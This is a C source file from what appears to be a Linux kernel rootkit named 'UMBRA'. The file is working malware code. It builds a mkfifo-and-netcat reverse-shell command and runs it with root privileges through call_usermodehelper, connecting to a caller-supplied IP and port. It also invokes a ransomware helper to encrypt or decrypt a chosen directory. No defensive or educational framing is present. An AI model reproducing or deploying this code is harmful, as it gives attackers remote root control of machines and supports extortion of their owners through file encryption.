#include "../include/utils.h"


#define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
#define HOME "HOME=/root"
#define TERM "TERM=xterm"
#define SHELL "/bin/bash"
#define EXEC_P1 "/bin/rm /tmp/umbra;/usr/bin/mkfifo /tmp/umbra;/bin/cat /tmp/umbra|/bin/sh -i 2>&1|/bin/nc "
#define EXEC_P2 " >/tmp/umbra"
				


void execute_reverse_shell(struct work_struct *work){
    //We know the strings are allocated right after the work in the struct shell_params, so we cast it
    int err;
    struct shell_params *params = (struct shell_params*)work;
    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL}; //Null terminated
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, EXEC_P1);
    strcat(exec, params->target_ip);
    strcat(exec, " ");
    strcat(exec, params->target_port);
    strcat(exec, EXEC_P2);
    printk(KERN_INFO "UMBRA:: Starting reverse shell\n");
    
    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error executing usermodehelper.\n");
    }
    kfree(exec);
    kfree(params->target_ip);
    kfree(params->target_port);
    kfree(params);

}

void execute_module (struct work_struct *work) {
    int err;
    struct ransom_params *params = (struct ransom_params*)work;
    char path[] = "/tmp/umbra/ransom";
    char* envp[] = {"HOME=/root", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    char* argv[] = {SHELL, "-c", exec, NULL};
    
    switch(params->module){
        case RANSOM_ENCRYPT: ;
            strcat(exec, path);
            strcat(exec, " -d ");
            strcat(exec, params->args);
            strcat(exec, " -m E");
            printk(KERN_INFO "UMBRA:: Calling ransom module ENCRYPT MODE %s\n", argv[2]);
            err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
            if(err<0){
                printk(KERN_INFO "UMBRA:: Error executing usermodehelper.\n");
            }
            break;
        case RANSOM_DECRYPT: ;
            strcat(exec, path);
            strcat(exec, " -d ");
            strcat(exec, params->args);
            strcat(exec, " -m D");
            printk(KERN_INFO "UMBRA:: Calling ransom module DECRYPT MODE %s \n", argv[2]);
            err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
            if(err<0){
                printk(KERN_INFO "UMBRA:: Error executing usermodehelper.\n");
            }
            break;
    }
    
}

int start_ransom_module(umbra_module module, char* args){
    int err;
    struct ransom_params *params = kmalloc(sizeof(struct ransom_params), GFP_KERNEL);
    if(!params){
        printk(KERN_INFO "UMBRA:: Error allocating memory\n");
        return 1;
    }
    params->args = kstrdup(args, GFP_KERNEL);
    params->module = module;
    printk(KERN_INFO "Loading work\n");
    INIT_WORK(&params->work, &execute_module);

    err = schedule_work(&params->work);
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error scheduling work of starting ransom module\n");
    }
    return err;
}

int start_reverse_shell(char* ip, char* port){
    //Reserve memory for parameters and start work
    int err;
    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
        printk(KERN_INFO "UMBRA:: Error allocating memory\n");
        return 1;
    }
    params->target_ip = kstrdup(ip, GFP_KERNEL);
    params->target_port = kstrdup(port, GFP_KERNEL);
    printk(KERN_INFO "Loading work\n");
    INIT_WORK(&params->work, &execute_reverse_shell);

    err = schedule_work(&params->work);
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error scheduling work of starting shell\n");
    }
    return err;

}
